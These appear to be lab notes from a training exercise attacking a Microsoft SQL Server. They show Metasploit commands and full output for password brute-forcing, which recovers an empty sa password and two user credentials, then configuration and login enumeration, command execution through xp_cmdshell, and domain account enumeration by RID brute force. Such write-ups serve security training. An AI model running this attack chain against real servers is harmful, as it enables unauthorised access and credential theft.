### SQL4

**Objective**:
- Discover valid users and their passwords
- Enumerate MSSQL configuration
- Enumerate all MSSQL logins
- Execute a command on the target machine
- Enumerate all available system users

[[ping]]

```
root@attackdefense:~# ping -c 5 10.5.29.94
PING 10.5.29.94 (10.5.29.94) 56(84) bytes of data.
64 bytes from 10.5.29.94: icmp_seq=1 ttl=125 time=6.33 ms
64 bytes from 10.5.29.94: icmp_seq=2 ttl=125 time=1.59 ms
64 bytes from 10.5.29.94: icmp_seq=3 ttl=125 time=1.69 ms
64 bytes from 10.5.29.94: icmp_seq=4 ttl=125 time=1.65 ms
64 bytes from 10.5.29.94: icmp_seq=5 ttl=125 time=1.74 ms

--- 10.5.29.94 ping statistics ---
5 packets transmitted, 5 received, 0% packet loss, time 4007ms
rtt min/avg/max/mdev = 1.587/2.600/6.329/1.865 ms
```

[[Hack2.0/NMAP#General Scan|NMAP basic scan]]

```
root@attackdefense:~# nmap 10.5.29.94
Starting Nmap 7.91 ( https://nmap.org ) at 2023-07-11 21:52 IST
Nmap scan report for 10.5.29.94
Host is up (0.0015s latency).
Not shown: 987 closed ports
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
1433/tcp open  ms-sql-s
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
3389/tcp open  ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 1.65 seconds
```


```
root@attackdefense:~# nmap -p1433 --script ms-sql-info 10.5.29.94
Starting Nmap 7.91 ( https://nmap.org ) at 2023-07-11 21:54 IST
Nmap scan report for 10.5.29.94
Host is up (0.0018s latency).

PORT     STATE SERVICE
1433/tcp open  ms-sql-s

Host script results:
| ms-sql-info: 
|   10.5.29.94:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433

Nmap done: 1 IP address (1 host up) scanned in 0.36 seconds
```

[[metasploit]]

```
root@attackdefense:~# msfconsole
msf6 > search mssql

Matching Modules
================

   #   Name                                                      Disclosure Date  Rank       Check  Description
   -   ----                                                      ---------------  ----       -----  -----------
   0   exploit/windows/misc/ais_esel_server_rce                  2019-03-27       excellent  Yes    AIS logistics ESEL-Server Unauth SQL Injection RCE
   1   auxiliary/server/capture/mssql                                             normal     No     Authentication Capture: MSSQL
   2   auxiliary/gather/lansweeper_collector                                      normal     No     Lansweeper Credential Collector
   3   exploit/windows/mssql/lyris_listmanager_weak_pass         2005-12-08       excellent  No     Lyris ListManager MSDE Weak sa Password
   4   exploit/windows/mssql/ms02_039_slammer                    2002-07-24       good       Yes    MS02-039 Microsoft SQL Server Resolution Overflow
   5   exploit/windows/mssql/ms02_056_hello                      2002-08-05       good       Yes    MS02-056 Microsoft SQL Server Hello Overflow
   6   exploit/windows/mssql/ms09_004_sp_replwritetovarbin       2008-12-09       good       Yes    MS09-004 Microsoft SQL Server sp_replwritetovarbin Memory Corruption
   7   exploit/windows/mssql/ms09_004_sp_replwritetovarbin_sqli  2008-12-09       excellent  Yes    MS09-004 Microsoft SQL Server sp_replwritetovarbin Memory Corruption via SQL Injection
   8   exploit/windows/iis/msadc                                 1998-07-17       excellent  Yes    MS99-025 Microsoft IIS MDAC msadcs.dll RDS Arbitrary Remote Command Execution
   9   auxiliary/scanner/mssql/mssql_login                                        normal     No     MSSQL Login Utility
   10  auxiliary/scanner/mssql/mssql_hashdump                                     normal     No     MSSQL Password Hashdump
   11  auxiliary/scanner/mssql/mssql_ping                                         normal     No     MSSQL Ping Utility
   12  auxiliary/scanner/mssql/mssql_schemadump                                   normal     No     MSSQL Schema Dump
   13  exploit/windows/mssql/mssql_clr_payload                   1999-01-01       excellent  Yes    Microsoft SQL Server Clr Stored Procedure Payload Execution
   14  auxiliary/admin/mssql/mssql_exec                                           normal     No     Microsoft SQL Server Command Execution
   15  auxiliary/admin/mssql/mssql_enum                                           normal     No     Microsoft SQL Server Configuration Enumerator
   16  exploit/windows/mssql/mssql_linkcrawler                   2000-01-01       great      No     Microsoft SQL Server Database Link Crawling Command Execution
   17  auxiliary/admin/mssql/mssql_escalate_dbowner                               normal     No     Microsoft SQL Server Escalate Db_Owner
   18  auxiliary/admin/mssql/mssql_escalate_execute_as                            normal     No     Microsoft SQL Server Escalate EXECUTE AS
   19  auxiliary/admin/mssql/mssql_findandsampledata                              normal     No     Microsoft SQL Server Find and Sample Data
   20  auxiliary/admin/mssql/mssql_sql                                            normal     No     Microsoft SQL Server Generic Query
   21  auxiliary/admin/mssql/mssql_sql_file                                       normal     No     Microsoft SQL Server Generic Query from File
   22  auxiliary/admin/mssql/mssql_idf                                            normal     No     Microsoft SQL Server Interesting Data Finder
   23  auxiliary/admin/mssql/mssql_ntlm_stealer                                   normal     No     Microsoft SQL Server NTLM Stealer
   24  exploit/windows/mssql/mssql_payload                       2000-05-30       excellent  Yes    Microsoft SQL Server Payload Execution
   25  exploit/windows/mssql/mssql_payload_sqli                  2000-05-30       excellent  No     Microsoft SQL Server Payload Execution via SQL Injection
   26  auxiliary/admin/mssql/mssql_escalate_dbowner_sqli                          normal     No     Microsoft SQL Server SQLi Escalate Db_Owner
   27  auxiliary/admin/mssql/mssql_escalate_execute_as_sqli                       normal     No     Microsoft SQL Server SQLi Escalate Execute AS
   28  auxiliary/admin/mssql/mssql_ntlm_stealer_sqli                              normal     No     Microsoft SQL Server SQLi NTLM Stealer
   29  auxiliary/admin/mssql/mssql_enum_domain_accounts_sqli                      normal     No     Microsoft SQL Server SQLi SUSER_SNAME Windows Domain Account Enumeration
   30  auxiliary/admin/mssql/mssql_enum_sql_logins                                normal     No     Microsoft SQL Server SUSER_SNAME SQL Logins Enumeration
   31  auxiliary/admin/mssql/mssql_enum_domain_accounts                           normal     No     Microsoft SQL Server SUSER_SNAME Windows Domain Account Enumeration
   32  auxiliary/analyze/crack_databases                                          normal     No     Password Cracker: Databases
   33  exploit/windows/http/plesk_mylittleadmin_viewstate        2020-05-15       excellent  Yes    Plesk/myLittleAdmin ViewState .NET Deserialization
   34  post/windows/gather/credentials/mssql_local_hashdump                       normal     No     Windows Gather Local SQL Server Hash Dump
   35  post/windows/manage/mssql_local_auth_bypass                                normal     No     Windows Manage Local Microsoft SQL Server Authorization Bypass


Interact with a module by name or index. For example info 35, use 35 or use post/windows/manage/mssql_local_auth_bypass

msf6 > use 9
msf6 auxiliary(scanner/mssql/mssql_login) > set rhosts 10.5.29.94
rhosts => 10.5.29.94
msf6 auxiliary(scanner/mssql/mssql_login) > set user_file /usr/share/metasploit-framework/data/wordlists/common_users.txt
user_file => /usr/share/metasploit-framework/data/wordlists/common_users.txt
msf6 auxiliary(scanner/mssql/mssql_login) > set pass_file /root/Desktop/wordlist/100-common-passwords.txt
pass_file => /root/Desktop/wordlist/100-common-passwords.txt
msf6 auxiliary(scanner/mssql/mssql_login) > set verbose false
verbose => false
msf6 auxiliary(scanner/mssql/mssql_login) > run

[*] 10.5.29.94:1433       - 10.5.29.94:1433 - MSSQL - Starting authentication scanner.
[+] 10.5.29.94:1433       - 10.5.29.94:1433 - Login Successful: WORKSTATION\sa:
[+] 10.5.29.94:1433       - 10.5.29.94:1433 - Login Successful: WORKSTATION\auditor:nikita
[*] 10.5.29.94:1433       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/mssql/mssql_login) > set user_file /root/Desktop/wordlist/common_users.txt
user_file => /root/Desktop/wordlist/common_users.txt
msf6 auxiliary(scanner/mssql/mssql_login) > run

[*] 10.5.29.94:1433       - 10.5.29.94:1433 - MSSQL - Starting authentication scanner.
[+] 10.5.29.94:1433       - 10.5.29.94:1433 - Login Successful: WORKSTATION\sa:
[+] 10.5.29.94:1433       - 10.5.29.94:1433 - Login Successful: WORKSTATION\dbadmin:anamaria
[+] 10.5.29.94:1433       - 10.5.29.94:1433 - Login Successful: WORKSTATION\auditor:nikita
[*] 10.5.29.94:1433       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/mssql/mssql_login) > 
```

```
msf6 > use 15
msf6 auxiliary(admin/mssql/mssql_enum) > options

Module options (auxiliary/admin/mssql/mssql_enum):

   Name                 Current Setting  Required  Description
   ----                 ---------------  --------  -----------
   PASSWORD                              no        The password for the specified username
   RHOSTS                                yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT                1433             yes       The target port (TCP)
   TDSENCRYPTION        false            yes       Use TLS/SSL for TDS data "Force Encryption"
   USERNAME             sa               no        The username to authenticate as
   USE_WINDOWS_AUTHENT  false            yes       Use windows authentification (requires DOMAIN option set)

msf6 auxiliary(admin/mssql/mssql_enum) > set rhosts 10.5.29.94
rhosts => 10.5.29.94
msf6 auxiliary(admin/mssql/mssql_enum) > run
[*] Running module against 10.5.29.94

[*] 10.5.29.94:1433 - Running MS SQL Server Enumeration...
[*] 10.5.29.94:1433 - Version:
[*]	Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64) 
[*]		Sep 24 2019 13:48:23 
[*]		Copyright (C) 2019 Microsoft Corporation
[*]		Express Edition (64-bit) on Windows Server 2016 Datacenter 10.0 <X64> (Build 14393: ) (Hypervisor)
[*] 10.5.29.94:1433 - Configuration Parameters:
[*] 10.5.29.94:1433 - 	C2 Audit Mode is Not Enabled
[*] 10.5.29.94:1433 - 	xp_cmdshell is Enabled
[*] 10.5.29.94:1433 - 	remote access is Enabled
[*] 10.5.29.94:1433 - 	allow updates is Not Enabled
[*] 10.5.29.94:1433 - 	Database Mail XPs is Not Enabled
[*] 10.5.29.94:1433 - 	Ole Automation Procedures are Not Enabled
[*] 10.5.29.94:1433 - Databases on the server:
[*] 10.5.29.94:1433 - 	Database name:master
[*] 10.5.29.94:1433 - 	Database Files for master:
[*] 10.5.29.94:1433 - 		C:\Program Files\Microsoft SQL Server\MSSQL15.SQLEXPRESS\MSSQL\DATA\master.mdf
[*] 10.5.29.94:1433 - 		C:\Program Files\Microsoft SQL Server\MSSQL15.SQLEXPRESS\MSSQL\DATA\mastlog.ldf
[*] 10.5.29.94:1433 - 	Database name:tempdb
[*] 10.5.29.94:1433 - 	Database Files for tempdb:
[*] 10.5.29.94:1433 - 		C:\Program Files\Microsoft SQL Server\MSSQL15.SQLEXPRESS\MSSQL\DATA\tempdb.mdf
[*] 10.5.29.94:1433 - 		C:\Program Files\Microsoft SQL Server\MSSQL15.SQLEXPRESS\MSSQL\DATA\templog.ldf
[*] 10.5.29.94:1433 - 	Database name:model
[*] 10.5.29.94:1433 - 	Database Files for model:
[*] 10.5.29.94:1433 - 		C:\Program Files\Microsoft SQL Server\MSSQL15.SQLEXPRESS\MSSQL\DATA\model.mdf
[*] 10.5.29.94:1433 - 		C:\Program Files\Microsoft SQL Server\MSSQL15.SQLEXPRESS\MSSQL\DATA\modellog.ldf
[*] 10.5.29.94:1433 - 	Database name:msdb
[*] 10.5.29.94:1433 - 	Database Files for msdb:
[*] 10.5.29.94:1433 - 		C:\Program Files\Microsoft SQL Server\MSSQL15.SQLEXPRESS\MSSQL\DATA\MSDBData.mdf
[*] 10.5.29.94:1433 - 		C:\Program Files\Microsoft SQL Server\MSSQL15.SQLEXPRESS\MSSQL\DATA\MSDBLog.ldf
[*] 10.5.29.94:1433 - System Logins on this Server:
[*] 10.5.29.94:1433 - 	sa
[*] 10.5.29.94:1433 - 	##MS_SQLResourceSigningCertificate##
[*] 10.5.29.94:1433 - 	##MS_SQLReplicationSigningCertificate##
[*] 10.5.29.94:1433 - 	##MS_SQLAuthenticatorCertificate##
[*] 10.5.29.94:1433 - 	##MS_PolicySigningCertificate##
[*] 10.5.29.94:1433 - 	##MS_SmoExtendedSigningCertificate##
[*] 10.5.29.94:1433 - 	##MS_PolicyEventProcessingLogin##
[*] 10.5.29.94:1433 - 	##MS_PolicyTsqlExecutionLogin##
[*] 10.5.29.94:1433 - 	##MS_AgentSigningCertificate##
[*] 10.5.29.94:1433 - 	EC2AMAZ-5861GL6\Administrator
[*] 10.5.29.94:1433 - 	NT SERVICE\SQLWriter
[*] 10.5.29.94:1433 - 	NT SERVICE\Winmgmt
[*] 10.5.29.94:1433 - 	NT Service\MSSQL$SQLEXPRESS
[*] 10.5.29.94:1433 - 	BUILTIN\Users
[*] 10.5.29.94:1433 - 	NT AUTHORITY\SYSTEM
[*] 10.5.29.94:1433 - 	NT SERVICE\SQLTELEMETRY$SQLEXPRESS
[*] 10.5.29.94:1433 - 	dbadmin
[*] 10.5.29.94:1433 - 	auditor
[*] 10.5.29.94:1433 - 	admin
[*] 10.5.29.94:1433 - Disabled Accounts:
[*] 10.5.29.94:1433 - 	##MS_PolicyEventProcessingLogin##
[*] 10.5.29.94:1433 - 	##MS_PolicyTsqlExecutionLogin##
[*] 10.5.29.94:1433 - No Accounts Policy is set for:
[*] 10.5.29.94:1433 - 	sa
[*] 10.5.29.94:1433 - 	dbadmin
[*] 10.5.29.94:1433 - 	auditor
[*] 10.5.29.94:1433 - 	admin
[*] 10.5.29.94:1433 - Password Expiration is not checked for:
[*] 10.5.29.94:1433 - 	sa
[*] 10.5.29.94:1433 - 	##MS_PolicyEventProcessingLogin##
[*] 10.5.29.94:1433 - 	##MS_PolicyTsqlExecutionLogin##
[*] 10.5.29.94:1433 - 	dbadmin
[*] 10.5.29.94:1433 - 	auditor
[*] 10.5.29.94:1433 - 	admin
[*] 10.5.29.94:1433 - System Admin Logins on this Server:
[*] 10.5.29.94:1433 - 	sa
[*] 10.5.29.94:1433 - 	EC2AMAZ-5861GL6\Administrator
[*] 10.5.29.94:1433 - 	NT SERVICE\SQLWriter
[*] 10.5.29.94:1433 - 	NT SERVICE\Winmgmt
[*] 10.5.29.94:1433 - 	NT Service\MSSQL$SQLEXPRESS
[*] 10.5.29.94:1433 - Windows Logins on this Server:
[*] 10.5.29.94:1433 - 	EC2AMAZ-5861GL6\Administrator
[*] 10.5.29.94:1433 - 	NT SERVICE\SQLWriter
[*] 10.5.29.94:1433 - 	NT SERVICE\Winmgmt
[*] 10.5.29.94:1433 - 	NT Service\MSSQL$SQLEXPRESS
[*] 10.5.29.94:1433 - 	NT AUTHORITY\SYSTEM
[*] 10.5.29.94:1433 - 	NT SERVICE\SQLTELEMETRY$SQLEXPRESS
[*] 10.5.29.94:1433 - Windows Groups that can logins on this Server:
[*] 10.5.29.94:1433 - 	BUILTIN\Users
[*] 10.5.29.94:1433 - Accounts with Username and Password being the same:
[*] 10.5.29.94:1433 - 	No Account with its password being the same as its username was found.
[*] 10.5.29.94:1433 - Accounts with empty password:
[*] 10.5.29.94:1433 - 	sa
[*] 10.5.29.94:1433 - Stored Procedures with Public Execute Permission found:
[*] 10.5.29.94:1433 - 	sp_replsetsyncstatus
[*] 10.5.29.94:1433 - 	sp_replcounters
[*] 10.5.29.94:1433 - 	sp_replsendtoqueue
[*] 10.5.29.94:1433 - 	sp_resyncexecutesql
[*] 10.5.29.94:1433 - 	sp_prepexecrpc
[*] 10.5.29.94:1433 - 	sp_repltrans
[*] 10.5.29.94:1433 - 	sp_xml_preparedocument
[*] 10.5.29.94:1433 - 	xp_qv
[*] 10.5.29.94:1433 - 	xp_getnetname
[*] 10.5.29.94:1433 - 	sp_releaseschemalock
[*] 10.5.29.94:1433 - 	sp_refreshview
[*] 10.5.29.94:1433 - 	sp_replcmds
[*] 10.5.29.94:1433 - 	sp_unprepare
[*] 10.5.29.94:1433 - 	sp_resyncprepare
[*] 10.5.29.94:1433 - 	sp_createorphan
[*] 10.5.29.94:1433 - 	xp_dirtree
[*] 10.5.29.94:1433 - 	sp_replwritetovarbin
[*] 10.5.29.94:1433 - 	sp_replsetoriginator
[*] 10.5.29.94:1433 - 	sp_xml_removedocument
[*] 10.5.29.94:1433 - 	sp_repldone
[*] 10.5.29.94:1433 - 	sp_reset_connection
[*] 10.5.29.94:1433 - 	xp_fileexist
[*] 10.5.29.94:1433 - 	xp_fixeddrives
[*] 10.5.29.94:1433 - 	sp_getschemalock
[*] 10.5.29.94:1433 - 	sp_prepexec
[*] 10.5.29.94:1433 - 	xp_revokelogin
[*] 10.5.29.94:1433 - 	sp_execute_external_script
[*] 10.5.29.94:1433 - 	sp_resyncuniquetable
[*] 10.5.29.94:1433 - 	sp_replflush
[*] 10.5.29.94:1433 - 	sp_resyncexecute
[*] 10.5.29.94:1433 - 	xp_grantlogin
[*] 10.5.29.94:1433 - 	sp_droporphans
[*] 10.5.29.94:1433 - 	xp_regread
[*] 10.5.29.94:1433 - 	sp_getbindtoken
[*] 10.5.29.94:1433 - 	sp_replincrementlsn
[*] 10.5.29.94:1433 - Instances found on this server:
[*] 10.5.29.94:1433 - 	SQLEXPRESS
[*] 10.5.29.94:1433 - Default Server Instance SQL Server Service is running under the privilege of:
[*] 10.5.29.94:1433 - 	xp_regread might be disabled in this system
[*] Auxiliary module execution completed
msf6 auxiliary(admin/mssql/mssql_enum) > 
```

```
msf6 auxiliary(admin/mssql/mssql_enum) > use 30
msf6 auxiliary(admin/mssql/mssql_enum_sql_logins) > options

Module options (auxiliary/admin/mssql/mssql_enum_sql_logins):

   Name                 Current Setting  Required  Description
   ----                 ---------------  --------  -----------
   FuzzNum              300              yes       Number of principal_ids to fuzz.
   PASSWORD                              no        The password for the specified username
   RHOSTS                                yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT                1433             yes       The target port (TCP)
   TDSENCRYPTION        false            yes       Use TLS/SSL for TDS data "Force Encryption"
   USERNAME             sa               no        The username to authenticate as
   USE_WINDOWS_AUTHENT  false            yes       Use windows authentification (requires DOMAIN option set)

msf6 auxiliary(admin/mssql/mssql_enum_sql_logins) > set rhosts 10.5.29.94
rhosts => 10.5.29.94
msf6 auxiliary(admin/mssql/mssql_enum_sql_logins) > run
[*] Running module against 10.5.29.94

[*] 10.5.29.94:1433 - Attempting to connect to the database server at 10.5.29.94:1433 as sa...
[+] 10.5.29.94:1433 - Connected.
[*] 10.5.29.94:1433 - Checking if sa has the sysadmin role...
[+] 10.5.29.94:1433 - sa is a sysadmin.
[*] 10.5.29.94:1433 - Setup to fuzz 300 SQL Server logins.
[*] 10.5.29.94:1433 - Enumerating logins...
[+] 10.5.29.94:1433 - 38 initial SQL Server logins were found.
[*] 10.5.29.94:1433 - Verifying the SQL Server logins...
[+] 10.5.29.94:1433 - 16 SQL Server logins were verified:
[*] 10.5.29.94:1433 -  - ##MS_PolicyEventProcessingLogin##
[*] 10.5.29.94:1433 -  - ##MS_PolicyTsqlExecutionLogin##
[*] 10.5.29.94:1433 -  - ##MS_SQLAuthenticatorCertificate##
[*] 10.5.29.94:1433 -  - ##MS_SQLReplicationSigningCertificate##
[*] 10.5.29.94:1433 -  - ##MS_SQLResourceSigningCertificate##
[*] 10.5.29.94:1433 -  - BUILTIN\Users
[*] 10.5.29.94:1433 -  - EC2AMAZ-5861GL6\Administrator
[*] 10.5.29.94:1433 -  - NT AUTHORITY\SYSTEM
[*] 10.5.29.94:1433 -  - NT SERVICE\SQLTELEMETRY$SQLEXPRESS
[*] 10.5.29.94:1433 -  - NT SERVICE\SQLWriter
[*] 10.5.29.94:1433 -  - NT SERVICE\Winmgmt
[*] 10.5.29.94:1433 -  - NT Service\MSSQL$SQLEXPRESS
[*] 10.5.29.94:1433 -  - admin
[*] 10.5.29.94:1433 -  - auditor
[*] 10.5.29.94:1433 -  - dbadmin
[*] 10.5.29.94:1433 -  - sa
[*] Auxiliary module execution completed
msf6 auxiliary(admin/mssql/mssql_enum_sql_logins) >
```

```
msf6 auxiliary(admin/mssql/mssql_enum_sql_logins) > use 14
msf6 auxiliary(admin/mssql/mssql_exec) > options

Module options (auxiliary/admin/mssql/mssql_exec):

   Name                 Current Setting                       Required  Description
   ----                 ---------------                       --------  -----------
   CMD                  cmd.exe /c echo OWNED > C:\owned.exe  no        Command to execute
   PASSWORD                                                   no        The password for the specified username
   RHOSTS                                                     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT                1433                                  yes       The target port (TCP)
   TDSENCRYPTION        false                                 yes       Use TLS/SSL for TDS data "Force Encryption"
   TECHNIQUE            xp_cmdshell                           yes       Technique to use for command execution (Accepted: xp_cmdshell, sp_oacreate)
   USERNAME             sa                                    no        The username to authenticate as
   USE_WINDOWS_AUTHENT  false                                 yes       Use windows authentification (requires DOMAIN option set)

msf6 auxiliary(admin/mssql/mssql_exec) > set rhosts 10.5.29.94
rhosts => 10.5.29.94
msf6 auxiliary(admin/mssql/mssql_exec) > set cmd whoami
cmd => whoami
msf6 auxiliary(admin/mssql/mssql_exec) > run
[*] Running module against 10.5.29.94

[*] 10.5.29.94:1433 - SQL Query: EXEC master..xp_cmdshell 'whoami'



 output
 ------
 nt service\mssql$sqlexpress

[*] Auxiliary module execution completed
msf6 auxiliary(admin/mssql/mssql_exec) >
```

```
msf6 auxiliary(admin/mssql/mssql_exec) > use 31
msf6 auxiliary(admin/mssql/mssql_enum_domain_accounts) > options

Module options (auxiliary/admin/mssql/mssql_enum_domain_accounts):

   Name                 Current Setting  Required  Description
   ----                 ---------------  --------  -----------
   FuzzNum              10000            yes       Number of principal_ids to fuzz.
   PASSWORD                              no        The password for the specified username
   RHOSTS                                yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT                1433             yes       The target port (TCP)
   TDSENCRYPTION        false            yes       Use TLS/SSL for TDS data "Force Encryption"
   USERNAME             sa               no        The username to authenticate as
   USE_WINDOWS_AUTHENT  false            yes       Use windows authentification (requires DOMAIN option set)

msf6 auxiliary(admin/mssql/mssql_enum_domain_accounts) > set rhosts 10.5.29.94
rhosts => 10.5.29.94
msf6 auxiliary(admin/mssql/mssql_enum_domain_accounts) > run
[*] Running module against 10.5.29.94

[*] 10.5.29.94:1433 - Attempting to connect to the database server at 10.5.29.94:1433 as sa...
[+] 10.5.29.94:1433 - Connected.
[*] 10.5.29.94:1433 - SQL Server Name: EC2AMAZ-5861GL6
[*] 10.5.29.94:1433 - Domain Name: CONTOSO
[+] 10.5.29.94:1433 - Found the domain sid: 010500000000000515000000cf4b5eb619bca0ed968e21ef
[*] 10.5.29.94:1433 - Brute forcing 10000 RIDs through the SQL Server, be patient...
[*] 10.5.29.94:1433 -  - EC2AMAZ-5861GL6\Administrator
[*] 10.5.29.94:1433 -  - CONTOSO\Guest
[*] 10.5.29.94:1433 -  - CONTOSO\krbtgt
[*] 10.5.29.94:1433 -  - CONTOSO\DefaultAccount
[*] 10.5.29.94:1433 -  - CONTOSO\Domain Admins
[*] 10.5.29.94:1433 -  - CONTOSO\Domain Users
[*] 10.5.29.94:1433 -  - CONTOSO\Domain Guests
[*] 10.5.29.94:1433 -  - CONTOSO\Domain Computers
[*] 10.5.29.94:1433 -  - CONTOSO\Domain Controllers
[*] 10.5.29.94:1433 -  - CONTOSO\Cert Publishers
[*] 10.5.29.94:1433 -  - CONTOSO\Schema Admins
[*] 10.5.29.94:1433 -  - CONTOSO\Enterprise Admins
[*] 10.5.29.94:1433 -  - CONTOSO\Group Policy Creator Owners
[*] 10.5.29.94:1433 -  - CONTOSO\Read-only Domain Controllers
[*] 10.5.29.94:1433 -  - CONTOSO\Cloneable Domain Controllers
[*] 10.5.29.94:1433 -  - CONTOSO\Protected Users
[*] 10.5.29.94:1433 -  - CONTOSO\Key Admins
[*] 10.5.29.94:1433 -  - CONTOSO\Enterprise Key Admins
[*] 10.5.29.94:1433 -  - CONTOSO\RAS and IAS Servers
[*] 10.5.29.94:1433 -  - CONTOSO\Allowed RODC Password Replication Group
[*] 10.5.29.94:1433 -  - CONTOSO\Denied RODC Password Replication Group
[*] 10.5.29.94:1433 -  - CONTOSO\SQLServer2005SQLBrowserUser$EC2AMAZ-5861GL6
[*] 10.5.29.94:1433 -  - CONTOSO\MSSQL-SERVER$
[*] 10.5.29.94:1433 -  - CONTOSO\DnsAdmins
[*] 10.5.29.94:1433 -  - CONTOSO\DnsUpdateProxy
[*] 10.5.29.94:1433 -  - CONTOSO\alice
[*] 10.5.29.94:1433 -  - CONTOSO\bob
[*] 10.5.29.94:1433 -  - CONTOSO\sysadmin
[+] 10.5.29.94:1433 - 29 user accounts, groups, and computer accounts were found.
[*] 10.5.29.94:1433 - Query results have been saved to: /root/.msf4/loot/20230711223415_default_10.5.29.94_mssql.domain.acc_788696.txt
[*] Auxiliary module execution completed
msf6 auxiliary(admin/mssql/mssql_enum_domain_accounts) >
```
